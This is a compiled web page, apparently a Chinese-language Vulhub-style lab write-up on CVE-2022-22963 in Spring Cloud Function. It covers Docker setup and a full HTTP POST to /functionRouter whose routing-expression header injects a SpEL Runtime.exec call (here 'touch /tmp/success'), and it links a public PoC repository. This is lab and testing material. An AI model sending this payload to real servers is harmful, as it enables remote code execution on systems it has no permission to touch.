import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as r,a as e,b as n,d as t,e as s}from"./app-58e4a7d6.js";const l={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。",-1),p=e("p",null,"参考链接：",-1),h={href:"https://tanzu.vmware.com/security/cve-2022-22963",target:"_blank",rel:"noopener noreferrer"},m={href:"https://mp.weixin.qq.com/s/onYJWIESgLaWS64lCgsKdw",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f",target:"_blank",rel:"noopener noreferrer"},b=s(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个使用 Spring Cloud Function 3.2.2 编写的服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，执行 <code>curl http://your-ip:8080/uppercase -H &quot;Content-Type: text/plain&quot; --data-binary test</code> 即可执行 <code>uppercase</code> 函数，将输入字符串转换成大写。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>发送如下数据包，<code>spring.cloud.function.routing-expression</code> 头中包含的 SpEL 表达式将会被执行：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /functionRouter HTTP/1.1
Host: y:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/success&quot;)
Content-Type: text/plain
Content-Length: 4

test
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412163215931.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p><code>touch /tmp/success</code> 已经成功被执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412163527748.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2>`,11),f={href:"https://github.com/chaosec2021/EXP-POC/tree/main/Spring-cloud-function-SpEL-RCE",target:"_blank",rel:"noopener noreferrer"};function _(v,x){const i=o("ExternalLinkIcon");return c(),r("div",null,[d,u,p,e("ul",null,[e("li",null,[e("a",h,[n("https://tanzu.vmware.com/security/cve-2022-22963"),t(i)])]),e("li",null,[e("a",m,[n("https://mp.weixin.qq.com/s/onYJWIESgLaWS64lCgsKdw"),t(i)])]),e("li",null,[e("a",g,[n("https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f"),t(i)])])]),b,e("ul",null,[e("li",null,[n("Spring-cloud-function-SpEL-RCE："),e("a",f,[n("https://github.com/chaosec2021/EXP-POC/tree/main/Spring-cloud-function-SpEL-RCE"),t(i)])])])])}const E=a(l,[["render",_],["__file","Spring Cloud Function SpEL表达式命令注入 CVE-2022-22963.html.vue"]]);export{E as default};
